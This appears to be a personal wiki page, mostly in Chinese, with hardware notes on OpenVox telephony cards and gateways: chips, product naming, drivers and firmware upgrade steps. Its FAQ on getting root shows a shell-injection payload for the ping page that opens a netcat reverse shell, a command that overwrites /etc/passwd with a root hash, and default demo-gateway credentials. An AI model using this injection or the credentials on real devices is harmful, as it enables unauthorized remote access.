---
id: openvox
title: OpenVox
---

# OpenVox

* [OpenVox](http://www.openvox.cn/cn/)
* https://openvox.cn/pub/
* 210 vs 230
  * 230 has a longer wake width wise in the and not as steep; and the 210 has a steep shorter wake
  * The D230E/DE230E is an upgrade product of the D210E/DE210E.
* [D230E/DE230E on DAHDI User Manual](https://openvoxwiki.atlassian.net/wiki/spaces/UM/pages/917549/D230E+DE230E+on+DAHDI+User+Manual)
* http://www.openvox.cn/pub/
  * 公共文档
  * [D130/D230/D430 Series PRI Card_Datasheet](http://www.openvox.cn/pub/datasheets/English/D130_D230_D430_Series_PRI_Card_Datasheet.pdf)
* `cat /proc/interrupts`
  * 查看是否有独立中断
* 单机多卡需要时钟线
* A 卡都是附加 FXO-400, FSO-400
* D230E
  * [infineon](https://www.infineon.com/)
    * PEF 22554 HT v2.1
    * QuadFALC
    * G0624
    * Framer and LIU (Line Interface Unit) Component (FALC)
    * [Infineon Introduces 4-Line T1/E1/J1 Framer and LIU Component with Smallest Footprint and Lowest Power Consumption](https://www.infineon.com/cms/en/about-infineon/press/market-news/2002/129029.html)
  * 4x MNOVR MS1442 1443Y
  * AITRA cyclone IV
    * [Altera Cyclone® IV](https://www.altera.com.cn/products/fpga/cyclone-series/cyclone-iv/overview.html)
    * EP4CE10E17CBN
    * MALAYSIA
* 驱动下载 - https://openvox.cn/pub/drivers/dahdi-linux-complete/
* 演示网关
  * http://demo.openvox.cn:65327/
  * admin:admin

## 产品命名
* VS - VoxStack
  * 模块化系列网关
  * 支持热插拔
* AG - Analog Gateway - 模拟网关
* DGW - 数字网关
* SWG - Standalone Wireless Gateway - 独立无线网关
* GWM - Gateway Module - 网关模块
* 型号格式
  * D - Digit, B - BRI, X - 混合, G - GSM, A - Analog, V - 编码转换卡, TAP - 录音卡, WCD - G 卡的 WCDMA 扩展模块
  * E - 回声消除
  * 数字 路数 1,2,4,8,24
  * 版本 10/30, 30 是 10 的升级
  * P - PCI, E - PCIE
* GWM801O - 8口 FXO 模块
* GWM420L - 4口 LTE 模块

## 产品
- 常见芯片
  - M83241G13 - CPU Comcerto 1000
  - Altera Cyclone IV EP4CE10F17C8N - FPGA
  - asmedia asm1083 - PCIe to PCI 芯片
- E2M8HJ9DJ68P - VS 模块
  - M83241G13 - Freescale Semiconductor - NXP
    - Telecom Interface ICs C1K-LS102M 450MHz
    - IC C1K 450MHZ VOIP 448BGA
- FXS-420 v1.2 - FS42HJ1KK4UY5
  - S13215-FM
- FXO-400 v1.4 - FXODHJO2XT6L
  - 3019-FT 1718FF L0L4
  - Si3050-FT 1708EM F1Q5
- A810E v1.4 - A814HJ1DBGCZ - PCIe 卡
  - Altera Cyclone IV EP4CE10F17C8N - FPGA
  - asmedia asm1083 - PCIe to PCI 芯片
- VS-AGU-E2M0800 - VoxStack 系列 模拟网关
- VS-GGU-E2M0400 - VS 系列, GSM 网关
  - 硬件版本 Date 2012-11-09 FPGA 11 Hardware 00
  - 主板
    - RTL8316E
    - ATMLH424
- VS-GWM400
  - Quectel M35FAR01A08
  - Altera Cyclone IV EP4CE10F17C8N
  - asmedia asm1083
  - SPANSION S34ML01G200TF100 - Flash
  - CPU 是模块化接口
  - 850/900/1800/1900MHz@GSM
  - 900/2100MHz@UMTS
  - 900/1800MHz@GSM
- VS_USB-1044
  - LTE FDD: B1/B3/B5/B8
  - LTE TDD: B38/B39/B40/B41
  - TD-SCDMA: B34/B39
  - CDMA: BC0
  - WCDMA: 900/2100MHz
  - GSM: 900/1800MHz
  - Avahi - WirelessGateway _burn._tcp - 169.254.8.223
  - 支持 SIM 模块类型
    - EC20
    - M26
    - M35 - LTE 4G
    - MCU
    - SIM6320C

## M83241G13
- ARM1136 - 2 Core, 650MHz
- 敏迅科技/Mindspeed Technologies 芯片
- Mindspeed 主要提供 VoIP 领域解决方案 - DSP, LTE, Transcede
- VoIP, Security Engine, PCIe 2, RGMII 2
- SDRAM 16/32 bit DDR2-800/667/533
- L1 缓存 2x(64K D$/64K I$)
- VoIP 能力
  - Field hardened voice features
  - World class acoustic echo cancellation technology
  - Narrow and wideband codecs
  - G.711, G.729, G.722, G.723.1, iLBC, T.38, G.729.1, G.722.2, AMR, AMR Wideband
  - Enhanced echo canceller, CID-I/II, VAD/CNG, AGC
  - 3-Way conferencing
- TDM/PCM interface for glue-less VoIP support
- 2009 年

## A810

* Communication controller: OpenVox Communication Co. Ltd. Device 0810 (rev 15)
* OpenVOX电话模拟语音卡 A810E Asterisk 卡8路语音卡FXO/FXS模块化 A810E
* AE810E/AE810P [手册](https://openvox.cn/pub/misc/AE810E_AE810P_Elastix%202.0.4_User_Manual_English.pdf)

```bash
modprobe –r opvxa24xx
```

## 固件
* https://www.openvox.cn/pub/firmwares

```bash
# 升级流程
auto_update -i 1
auto_update -b u-boot.bin
auto_update -u -f AnalogGateway.img
```

## FAQ
### 获取 root 权限
1. ssh 用户名修改为 super 即可
2. ping 页面进行 shell 注入
  * `google.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc yourip 1234 >/tmp/f`

```bash
cat /etc/passwd
echo 'root:$6$p5UxF/96kKYh3eVj$laEQueyeV4tDJV5ASR3kj7r5X/BtXQ/PJM4dCrnAo1M8HtSlDWupG7TQQ.r1wTncK.Jze4NNa9UN37wvT0L/L/:0:0:root:/tmp:/bin/bash' > /etc/passwd
```

### torybox 工具包

```bash
wget https://landley.net/toybox/downloads/binaries/latest/toybox-$(uanem -m)
```

### clone system

```bash
ssh -p 12345 root@192.168.99.1 'cd /etc; tar cf - ./' | tar xvf - -C etc
```

### fix local perm

```bash
find . -type d | xargs chmod 0744
find . -type f | xargs chmod 0644
```
